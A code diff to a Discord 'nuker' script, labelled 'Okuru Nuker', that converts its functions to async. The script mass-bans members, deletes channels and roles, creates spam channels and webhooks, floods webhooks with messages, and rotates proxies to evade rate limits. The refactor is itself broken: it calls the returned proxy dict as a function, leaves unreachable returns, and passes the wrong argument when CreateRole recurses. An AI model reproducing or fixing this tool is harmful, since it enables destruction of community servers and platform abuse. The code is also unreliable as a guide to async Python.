@@ -51,7 +51,7 @@ util.setTitle('[Okuru Nuker] - Loaded Scraped')
 proxyPool = cycle(proxies)
 token_type = util.checkToken(token)
 
-def getProxyDict():
+async def get_proxy_dict():
     if(not config['General']['Use Proxies']):
         return({})
     return({'https://': 'http://{}'.format(next(proxyPool))})
@@ -70,7 +70,7 @@ class NukeFunctions:
         try:
             r = httpx.put(
                 'https://discord.com/api/{}/guilds/{}/bans/{}'.format(api, guild, UserID),
-                proxies=getProxyDict(),
+                proxies=await get_proxy_dict()(),
                 headers=headers
             )
             if r.status_code in [200, 201, 204]:
@@ -79,14 +79,14 @@ class NukeFunctions:
                 util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
                 NukeFunctions.BanUser(UserID)
             return(True)
-        except Exception as e:
-            print(e)
-            return(NukeFunctions.BanUser(UserID))
+        except Exception:
+            return(await NukeFunctions.BanUser(UserID))
+        return(True)
     async def DeleteChannel(ChannelID: str) -> bool:
         try:
             r = httpx.delete(
                 'https://discord.com/api/{}/channels/{}'.format(api, ChannelID),
-                #proxies=getProxyDict(),
+                #proxies=await get_proxy_dict()(),
                 headers=headers
             )
 
@@ -96,13 +96,13 @@ class NukeFunctions:
                 util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
                 NukeFunctions.DeleteChannel(ChannelID)
             return(True)
-        except:
-            return(NukeFunctions.DeleteChannel(ChannelID))
-        
+        except Exception:
+            return(await NukeFunctions.DeleteChannel(ChannelID))
+        return(True)
     async def DeleteRole(RoleID: str) -> bool:
         r = httpx.delete(
             'https://discord.com/api/{}/guilds/{}/roles/{}'.format(api, guild, RoleID),
-            proxies=getProxyDict(),
+            proxies=await get_proxy_dict()(),
             headers=headers
         )
         if r.status_code in [200, 201, 204]:
@@ -112,13 +112,13 @@ class NukeFunctions:
             return(NukeFunctions.DeleteRole(RoleID))
         return(True)
 
-    def MakeWebhook(ChannelID: str) -> str:
+    async def MakeWebhook(ChannelID: str) -> str:
         try:
             r = httpx.post(
                 'https://discord.com/api/{}/channels/{}/webhooks'.format(api, ChannelID),
                 headers=headers,
                 json={'name': random.choice(WebhookNames)},
-                proxies=getProxyDict()
+                proxies=await get_proxy_dict()()
             ).json()
             return('https://discord.com/api/webhooks/{}/{}'.format(r['id'], r['token']))
         except:
@@ -126,23 +126,23 @@ class NukeFunctions:
         return('https://discord.com/')
 
 
-    def SendWebhook(WebhookURL: str) -> bool:
+    async def SendWebhook(WebhookURL: str) -> bool:
         for i in range(WebhookSpamAmount):
             try:
                 json={
                     'username': random.choice(WebhookNames),
                     'content': random.choice(WebhookContents)
                 }
-                httpx.post(WebhookURL, json=json, proxies=getProxyDict())
+                httpx.post(WebhookURL, json=json, proxies=await get_proxy_dict()())
                 return(True)
             except:
                 pass
         return(True)
 
-    def CreateChannel(ChannelID: str) -> bool:
+    async def CreateChannel(ChannelID: str) -> bool:
         r = httpx.post(
             'https://discord.com/api/{}/guilds/{}/channels'.format(api, guild),
-            proxies=getProxyDict(),
+            proxies=await get_proxy_dict()(),
             headers=headers,
             json={'name': ChannelID, 'type': 0}
         )
@@ -150,21 +150,22 @@ class NukeFunctions:
             util.log('[!]', 'Created {}#{}'.format(Fore.LIGHTCYAN_EX, ChannelID.replace(' ', '-')))
         elif r.status_code == 429:
             util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
-            return(NukeFunctions.CreateChannel(ChannelID))
+            return(await NukeFunctions.CreateChannel(ChannelID))
         return(True)
 
-def CreateRole(RoleID: str) -> bool:
-    r = httpx.post(
-        'https://discord.com/api/{}/guilds/{}/roles'.format(api, guild),
-        proxies=getProxyDict(),
-        headers=headers, 
-        json={'name': RoleID, 'type': 0}
-    )
-    if r.status_code in [200, 201, 204]:
-        util.log('[!]', 'Created {}{}'.format(Fore.LIGHTCYAN_EX, ChannelName))
-    elif r.status_code == 429:
-        util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
-        CreateRole(RoleID)
+    async def CreateRole(RoleID: str) -> bool:
+        r = httpx.post(
+            'https://discord.com/api/{}/guilds/{}/roles'.format(api, guild),
+            proxies=await get_proxy_dict()(),
+            headers=headers, 
+            json={'name': RoleName, 'type': 0}
+        )
+        if r.status_code in [200, 201, 204]:
+            util.log('[!]', 'Created {}{}'.format(Fore.LIGHTCYAN_EX, RoleName))
+        elif r.status_code == 429:
+            util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
+            return(await NukeFunctions.CreateRole(RoleName))
+        return(True)
 
 
 async def nukecmd():
